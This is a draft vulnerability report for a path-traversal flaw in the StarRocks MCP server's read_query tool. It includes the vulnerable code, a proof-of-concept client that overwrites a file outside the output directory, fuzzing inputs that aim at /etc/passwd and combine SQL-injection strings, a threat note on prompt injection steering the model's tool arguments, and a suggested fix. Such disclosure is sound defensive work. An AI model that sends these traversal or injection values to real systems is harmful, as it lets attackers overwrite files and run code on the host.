# Path traversal in `read_query`: `output_file` writes outside `STARROCKS_MCP_OUTPUT_DIR` (`../` and absolute paths)

**Repository:** `StarRocks/mcp-server-starrocks` · **Tool:** `read_query` · **Tested commit:** `88e782b`
**Weakness:** CWE-22 Path Traversal

## Summary
`read_query` can write a query result to the file named by `output_file`. Relative paths are documented as resolving against `STARROCKS_MCP_OUTPUT_DIR`, but `../` segments are not rejected, so a relative path can point anywhere. Absolute and `~` paths are used as-is by design. The server creates missing parent directories and overwrites existing files, and the caller shapes the file contents through the query. The result is a file create/overwrite primitive with the server's privileges, driven entirely by tool arguments.

## Details
`src/mcp_server_starrocks/server.py:92-105`:

```python
def _resolve_output_path(output_file: str) -> str:
    """Resolve output_file to an absolute path.

    Absolute paths (after ~ expansion) are used as-is. Relative paths are
    resolved against output_dir. The parent directory is created if missing.
    """
    path = os.path.expanduser(output_file)
    if not os.path.isabs(path):
        path = os.path.join(output_dir, path)
    path = os.path.abspath(path)
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    return path
```

`os.path.abspath` collapses `..`, but nothing checks that the result is still under `output_dir`. `read_query` calls this at `server.py:354-358` after a successful query, and `_write_result_to_file` opens the path with mode `'w'` (`server.py:125`, `:131`, `:136`), truncating any existing file. The column names and row values come from the query, so with `SELECT '<text>' AS c` the caller picks most of what is written.

## Steps to reproduce
1. Prerequisites: Python 3.11+ and `uv`. A StarRocks instance is optional. The client has a test switch, `STARROCKS_DUMMY_TEST` (`db_client.py:318`, `:658-672`), that makes every query return a fixed 3-row result (`name`: `aaa`, `bbb`, `ccc`) without connecting. That is enough to reach the file write. With a real StarRocks, use any query that returns rows.
2. Create a marker file outside the output directory:

   ```sh
   mkdir -p /tmp/tofu-poc/output && echo marker > /tmp/tofu-poc/outside.txt
   ```
3. Start the server as the README describes, with two environment variables: `STARROCKS_DUMMY_TEST=1 STARROCKS_MCP_OUTPUT_DIR=/tmp/tofu-poc/output uv run --with mcp-server-starrocks mcp-server-starrocks`. To test the tested commit, use `uv run --directory /path/to/mcp-server-starrocks mcp-server-starrocks` in a checkout at `88e782b`.
4. Call the tool with a relative path that climbs out of the output directory:

   ```json
   {"query": "SELECT 1", "output_file": "../outside.txt", "output_format": "csv"}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(
           command="uv",
           args=["run", "--with", "mcp-server-starrocks", "mcp-server-starrocks"],
           env={"STARROCKS_DUMMY_TEST": "1", "STARROCKS_MCP_OUTPUT_DIR": "/tmp/tofu-poc/output"},
       )
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("read_query", {"query": "SELECT 1", "output_file": "../outside.txt", "output_format": "csv"})
               print(result)

   asyncio.run(main())
   ```
5. The tool reports `Wrote 3 rows to /tmp/tofu-poc/outside.txt (...)`. `cat /tmp/tofu-poc/outside.txt` shows the CSV result (`name`, `aaa`, `bbb`, `ccc`) instead of `marker`.

## Expected behavior
Result files stay under `STARROCKS_MCP_OUTPUT_DIR`. A relative path containing `..` that leaves the directory is rejected. Writing to arbitrary absolute paths is either off by default or needs an explicit operator setting, and existing files are not overwritten without an explicit flag.

## Actual behavior
From the code, the path resolves to `/tmp/tofu-poc/outside.txt` and the file is overwritten. The fuzzing runs used `output_file` values such as `../../../../etc/passwd` and `/etc/passwd`, but StarRocks was unreachable there, so the tool returned at `server.py:346-349` before any write:

```
input:  {'query': 'UNION SELECT null, username, password FROM users', 'db': 'main', 'output_file': '../../../../etc/passwd', 'output_format': 'csv'}
output: Error: Error executing statement 'UNION SELECT null, username, password FROM users': 2003 (HY000): Can't connect to MySQL server on 'localhost:9030' (111)
```

## Impact
`query` and `output_file` are chosen by the model. Prompt injection in untrusted content, including text stored in a table that the model reads, can steer both. With them, an attacker can create or overwrite any file the server process can write, with content they mostly choose, and can create directories. Overwriting files that other programs later read or execute can escalate this to code execution as the server user. In `http`/`sse` deployments this happens on the server host. The README does document absolute paths as allowed, so part of this is intended. Even so, the `../` escape contradicts the documented "relative paths resolve against STARROCKS_MCP_OUTPUT_DIR", and an operator has no way to restrict writes to that directory.

## Suggested fix
Resolve the final path and require it to stay under the output directory, with an explicit opt-in for the current behavior:

```python
def _resolve_output_path(output_file: str) -> str:
    base = os.path.realpath(output_dir)
    path = os.path.realpath(os.path.join(base, output_file))
    if not ALLOW_ANY_OUTPUT_PATH and os.path.commonpath([base, path]) != base:
        raise ValueError("output_file must stay inside STARROCKS_MCP_OUTPUT_DIR")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    return path
```

`ALLOW_ANY_OUTPUT_PATH` would come from a new environment variable, off by default. `os.path.join` drops `base` for absolute input, so the same check covers absolute paths. Consider also opening with mode `'x'` (or an `overwrite` argument) so existing files are not truncated silently.

## Status on the default branch
Still present at `88e782b` (2026-09-08). The tested commit is the current head of the default branch.

## Prior reports
No issue or pull request mentions `output_file`, `STARROCKS_MCP_OUTPUT_DIR` or path containment. Searched all 27 issues and 30 pull requests (fetched 2026-10-01) and the README / docs on the default branch.
- #56 "fix: reject non-read-only SQL in read_query and query_and_plotly_chart" (PR, open 2026-09-08): touches `read_query` but only adds a leading-keyword DQL check (for #27); does not touch `_resolve_output_path` and does not fix this.
- Documentation: README.md: "Absolute paths passed to `output_file` (including `~`-prefixed paths) bypass this setting." (the `STARROCKS_MCP_OUTPUT_DIR` entry; absolute and `~` paths are documented as intended, and the `read_query` schema says "Relative paths resolve against STARROCKS_MCP_OUTPUT_DIR". Neither mentions `../`, so the relative-path escape is not documented)

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal (CWE-22). `check_path_traversal` fired: an input-pattern check, reported as a "Silent Bug Alert" because the tool returned without raising. `check_reflected_output` also triggered for this tool (same `db_client.py:621` echo as the CWE-79 drafts).
- Campaigns and executions: `corpus-sbx` 2048 executions / 2044 successful; `e2-0922` 1024 / 998; 60 s budgets.
- Evidence (verbatim, trimmed):
  - `{'query': 'SELECT * FROM users', 'db': None, 'output_file': '/etc/passwd', 'output_format': 'jsonl'}` -> `Error: Error executing statement 'SELECT * FROM users': 2003 (HY000): Can't connect to MySQL server on 'localhost:9030' (111)`
  - `{'query': 'UNION SELECT null, username, password FROM users', 'db': 'main', 'output_file': '../../../../etc/passwd', 'output_format': 'csv'}` -> same connection error
  - `{'query': "SELECT * FROM users WHERE id = 1' OR '1'='1", 'db': 'testdb', 'output_file': '..\\..\\..\\..\\windows\\win.ini', 'output_format': 'json'}` -> same connection error
- Hand-check hints: **real** on the code path (`output_file` -> `_resolve_output_path` -> `open(path, 'w')`, no containment), but note: (1) the fuzz run never reached the write because StarRocks was unreachable, so the alert itself is an input-pattern flag, not an observed write; (2) the sink is a write, not the read that the `/etc/passwd` payloads suggest; (3) absolute paths are documented in the README (`STARROCKS_MCP_OUTPUT_DIR` entry and the `read_query` schema), so maintainers may answer "by design". The `../` escape and the lack of an opt-out are the strongest points. `STARROCKS_DUMMY_TEST` is not in the README; I found it in `db_client.py`. Steps not executed (read-only review); output text and file contents are derived from the code.
</details>
